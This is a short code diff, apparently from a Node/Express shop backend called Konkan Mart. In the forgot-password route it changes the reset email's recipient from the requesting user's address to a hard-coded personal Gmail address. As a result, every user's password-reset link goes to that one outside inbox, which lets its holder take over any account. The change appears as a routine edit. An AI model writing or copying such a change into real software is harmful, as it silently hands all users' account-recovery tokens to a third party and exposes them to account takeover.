@@ -235,7 +235,7 @@ app.post('/api/auth/forgot-password', async (req, res) => {
 // console.log("Reset link:", resetLink);
     try {
       await transporter.sendMail({
-        to: user.email,
+        to: "cvaibhavi4444@gmail.com",
         subject: 'Konkan Mart Password Reset',
         html: `
           <h3>Password Reset</h3>
